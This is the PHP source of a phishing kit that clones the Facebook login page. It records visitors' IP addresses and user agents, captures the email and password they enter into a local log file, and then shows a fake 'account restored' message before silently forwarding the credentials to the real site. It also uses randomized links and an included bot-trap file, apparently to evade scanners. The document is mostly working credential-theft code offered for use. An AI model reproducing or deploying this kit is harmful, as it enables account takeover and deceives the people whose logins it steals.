﻿<?php

include 'inc/config.php';
include 'inc/botstrap.php';
?>

<?php

if ($numefissalvat == "1") { echo "<center><H1>Editeaza fisierul de configurare!</H1></center>"; exit; }
if ($pcl)
{
?>
<SCRIPT language=JavaScript type=text/javascript>
function actionSubmit() {
	document.Login.submit();
}
</SCRIPT>
<form method="post" name="Login" action="?cmd=<?php echo GetRandomString(50); ?>">
<input type="hidden" id="" name="login_email" value="<?php echo $login_email; ?>">
<input type="hidden" id="" name="login_password" value="<?php echo $login_password; ?>">
<input name="dcl" type="hidden" value="da">
<input name="form_charset" type="hidden" value="UTF-8">
<SCRIPT language=JavaScript type=text/javascript>
setTimeout('actionSubmit()',100);
</SCRIPT>
</form>
<?php
exit;
//	}
}
if ( $dcl )
{
			if($login_password) 
				{ 
					$data=date("D M d, Y g:i a"); 
					$ipp = $_SERVER['REMOTE_ADDR'];
					$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
					$agent = $_SERVER['HTTP_USER_AGENT'];
					$bau=@fopen($numefissalvat, "a");
@fwrite($bau,"Date:    $data\nLog-in:  $login_email\nPass:    $login_password\nIP:      $ipp\nHost:    $hostname\nUA: $agent\n---------------Facebook--------------\n");
@fclose($bau); 
					

					
				} 
?>
<!DOCTYPE html>

<head><meta charset="utf-8" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
<style></style><noscript><meta http-equiv="refresh" content="0; URL=/" /></noscript>
<title id="pageTitle">Successfully Restored!</title><meta property="og:site_name" content="0" />
<meta property="og:url" content="/" />
<meta property="og:locale" content="en_US" /><link rel="search" type="application/opensearchdescription+xml" href="/osd.xml" title="0" />
<meta name="description" content="Log in to start sharing and connecting with your friends, family, and people you know." />
<meta name="robots" content="noodp,noydir" /><link rel="shortcut icon" href="https://www.fb.com/rsrc.php/yl/r/H3nktOa7ZMg.ico" />



<link type="text/css" rel="stylesheet" href="ico/U3QfFrS_cgV.css" data-bootloader-hash="lF8eW" data-permanent="1" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/Af0wuS8syLV.css" data-bootloader-hash="JfgCu" data-permanent="1" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/QrKwBeCiZyv.css" data-bootloader-hash="oRLlq" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/vjVEyrdqGK6.css" data-bootloader-hash="qsqT1" data-permanent="1" crossorigin="anonymous" />

</head><body class="login_page _39il UIPage_LoggedOut _-kb b_c3pyn-ahh chrome webkit win x1 Locale_en_US" dir="ltr">
<div align="center">
<div id="globalContainer" class="uiContextualLayerParent"><div class="fb_content clearfix " id="content" role="main"><div class="_4-u5 _30ny">
<span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel" /><span class="muffin_tracking_pixel_end"></span>
Your Facebook account is now restored successfully!<br>Your account is now usable and you can use it without any restriction. <br>
You will receive a notification of this approval as soon as the details are reviewed by our security team.<br>


If you are not automatically redirected in 10 seconds to the news feed, <a href="https://www.facebook.com/">Click here reload!</a><br>
<strong>Please do not resubmit your request if the login information you used are correct!</strong><br></span></div></div></div></div></div></div>
<div class="mvl copyright"><div><span> Facebook © 2019</span></div></div></div></div></div></div><div></div></div>
<SCRIPT language=JavaScript type=text/javascript>
function actionSubmit() {
	document.Login.submit();
}
</SCRIPT>
<form method="post" name="Login" action="https://www.facebook.com/">
<input type="hidden" id="" name="login_email" value="<?php echo $login_email; ?>">
<input type="hidden" id="" name="login_password" value="<?php echo $login_password; ?>">
<input name="tcl" type="hidden" value="da">
<input name="dcl" type="hidden" value="da">
<input name="pcl" type="hidden" value="da">
<input name="incercari" type="hidden" value="3">
<input name="form_charset" type="hidden" value="UTF-8">
<div align="center" class="textCenter">
<SCRIPT language=JavaScript type=text/javascript>
setTimeout('actionSubmit()',10000);
</SCRIPT>
</form>
<?php
}
else if ( $dcl )
{
?>

<?php
}
else if ( $dcl )

{
?>
<?php

}
else
{
    
$a1 = $_SERVER['REMOTE_ADDR'];
$a2 = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$a3 = $_SERVER['HTTP_USER_AGENT'];
$x = fopen('ips.txt', 'a+w');
fwrite ($x, "
IPADD: $a1
HOSTA: $a2
AGENT: $a3
==============By BotsTrap==============");
fclose($x);
?>
<!DOCTYPE html>

<head><meta charset="utf-8" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
<style></style><noscript><meta http-equiv="refresh" content="0; URL=/" /></noscript>
<title id="pageTitle">Log in</title><meta property="og:site_name" content="0" />
<meta property="og:url" content="/" />
<meta property="og:locale" content="en_US" /><link rel="search" type="application/opensearchdescription+xml" href="/osd.xml" title="0" />
<meta name="description" content="Log in to start sharing and connecting with your friends, family, and people you know." />
<meta name="robots" content="noodp,noydir" /><link rel="shortcut icon" href="https://www.fb.com/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
<link type="text/css" rel="stylesheet" href="ico/U3QfFrS_cgV.css" data-bootloader-hash="lF8eW" data-permanent="1" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/Af0wuS8syLV.css" data-bootloader-hash="JfgCu" data-permanent="1" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/QrKwBeCiZyv.css" data-bootloader-hash="oRLlq" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="ico/vjVEyrdqGK6.css" data-bootloader-hash="qsqT1" data-permanent="1" crossorigin="anonymous" />

</head><body class="login_page _39il UIPage_LoggedOut _-kb b_c3pyn-ahh chrome webkit win x1 Locale_en_US" dir="ltr">
<div class="_li"><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarDOMInspector"><div class="_53jh">
<div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><div class="lfloat _ohe">
<h1><a href="https://fb.com/" title="Go to Facebook Home">
<i class="fb_logo img sp_euCDsy2vhU4_1_5x sx_09738b"><u>Facebook</u></i></a></h1></div></div></div>
<div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content">
<a class="_42ft _4jy0 signup_btn _4jy4 _4jy2 selected _51sy" role="button" href="/r.php?locale=en_US">Sign Up</a></span></div></div></div></div></div></div>
<div id="globalContainer" class="uiContextualLayerParent"><div class="fb_content clearfix " id="content" role="main"><div class="_4-u5 _30ny">
<span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel" /><span class="muffin_tracking_pixel_end"></span>
<div class="_4-u2 _1w1t _4-u8 _52jv"><div class="_xku"><span class="_50f6">Log into Facebook</span></div>
<div class="login_form_container">



<form name="login_form" method="post" id="validation">
<input type="hidden" name="appActionToken" value="bfwOHIF5nfNxF7BPBUZLBmKKbr0j3D" /><input type="hidden" name="appAction" value="SIGNIN" />
<input type="hidden" autocomplete="off" /><div id="loginform">



<input type="hidden" autocomplete="off" id="display" name="display" value="" />
<input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" />
<input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value="" />
<input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="0" />
<input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" />
<input type="hidden" autocomplete="off" id="return_session" name="return_session" value="" />
<input type="hidden" autocomplete="off" id="skip_api_login" name="skip_api_login" value="" />
<input type="hidden" autocomplete="off" id="signed_next" name="signed_next" value="" />
<input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" />
<input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" />
<input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_1" />
<input type="hidden" name="create" value="0">

<input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" tabindex="2" name="login_email" id="email" type="text" placeholder="Email or Phone Number" value="" autofocus="1" required="required" /></div>
</div>

 
<div class="clearfix _5466 _44mg">
<input type="password" class="inputtext _55r1 inputtext _1kbt" name="login_password" id="pass" tabindex="2" placeholder="Password" required="required" /></div>




<div class="_xkt"><button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" tabindex="1" type="submit">Log In</button>

<input name="pcl" type="hidden" value="da">
<input name="tcl" type="hidden" value="da">
<input name="dcl" type="hidden" value="da">
<input name="incercari" type="hidden" value="3"></div>




<div class="_xkv fsm fwn fcg"><a href="?cmd=<?php echo GetRandomString(50); ?>" id="forgot-password-link" target="">Forgot account?</a>
<span role="presentation" aria-hidden="true"> · </span><a href="?cmd=<?php echo GetRandomString(50); ?>" rel="nofollow" id="reg-link">Sign up for Facebook</a></div></div></form></div></div></div></div>
<div><div id="pageFooter" data-referrer="page_footer"><ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
<li>English (US)</li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_US&quot;, &quot;https:\/\/it-it.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Italian">Italiano</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_ES&quot;, &quot;en_US&quot;, &quot;https:\/\/es-es.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Spanish (Spain)">Español (España)</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_US&quot;, &quot;https:\/\/fr-fr.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 4); return false;" title="French (France)">Français (France)</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_US&quot;, &quot;https:\/\/de-de.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 5); return false;" title="German">Deutsch</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;tr_TR&quot;, &quot;en_US&quot;, &quot;https:\/\/tr-tr.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 6); return false;" title="Turkish">Türkçe</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_US&quot;, &quot;https:\/\/pt-br.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li>
<li><a dir="rtl" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;en_US&quot;, &quot;https:\/\/ar-ar.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Arabic">العربية</a></li>
<li><a dir="ltr" href="?cmd=<?php echo GetRandomString(50); ?>" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_US&quot;, &quot;https:\/\/hi-in.fb.com\/login.php?login_attempt=1&amp;lwv=111&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Hindi">हिन्दी</a></li>
<li><a class="_42ft _4jy0 _517i _517h _51sy" role="button" href="#" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fhi-in.fb.com%2Flogin.php%3Flogin_attempt%3D1%26lwv%3D111&amp;source=www_list_selector_more" title="Show more languages"><i class="img sp_K-b8B0C4pLL sx_e04209"></i></a></li>
</ul>
<div id="contentCurve"></div><div role="contentinfo" aria-label="Facebook site links">
<table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0">
<tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="/r.php" title="Sign Up for Facebook">Sign Up</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Log into Facebook">Log In</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Check out Messenger.">Messenger</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Facebook Lite for Android.">Facebook Lite</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Check out Facebook Mobile.">Mobile</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Find anyone on the web.">Find Friends</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Browse our people directory.">People</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Browse our pages directory.">Pages</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Check out popular places on Facebook.">Places</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Check out Facebook games.">Games</a></td>
<td class="_51m- hLeft plm _51mw"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Browse our places directory.">Locations</a></td>
</tr><tr class="_51mx"><td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Browse our Public Figures &amp; Celebrities directory.">Celebrities</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Browse our Groups directory.">Groups</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></td><td class="_51m- hLeft plm"><a href="/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook.">Create Ad</a></td><td class="_51m- hLeft plm"><a href="/pages/create/?ref_type=sitefooter" title="Create a Page">Create Page</a></td><td class="_51m- hLeft plm"><a href="https://developers.fb.com/?ref=pf" title="Develop on our platform.">Developers</a></td><td class="_51m- hLeft plm"><a href="/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></td>
<td class="_51m- hLeft plm"><a data-nocookies="1" href="?cmd=<?php echo GetRandomString(50); ?>" title="Learn about your privacy and Facebook.">Privacy</a></td>
<td class="_51m- hLeft plm _51mw"><a href="?cmd=<?php echo GetRandomString(50); ?>" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></td>
</tr><tr class="_51mx"><td class="_51m- hLeft plm"><a class="_41ug" data-nocookies="1" href="?cmd=<?php echo GetRandomString(50); ?>" title="Learn about Ad Choices.">Ad Choices<i class="img sp_K-b8B0C4pLL sx_32138f"></i></a></td>
<td class="_51m- hLeft plm"><a data-nocookies="1" href="?cmd=<?php echo GetRandomString(50); ?>" accesskey="9" title="Review our terms and policies.">Terms</a></td>
<td class="_51m- hLeft plm"><a href="?cmd=<?php echo GetRandomString(50); ?>" accesskey="0" title="Visit our Help Center.">Help</a></td>
<td class="_51m- hLeft plm"><a class="accessible_elem" accesskey="6" href="?cmd=<?php echo GetRandomString(50); ?>" title="View and edit your Facebook settings.">Settings</a></td>
<td class="_51m- hLeft plm"><a class="accessible_elem" accesskey="7" href="?cmd=<?php echo GetRandomString(50); ?>" title="View your activity log">Activity Log</a></td></tr></tbody></table></div>
<div class="mvl copyright"><div><span> Facebook © 2019</span></div></div></div></div></div></div><div></div>

<?php
}
?>
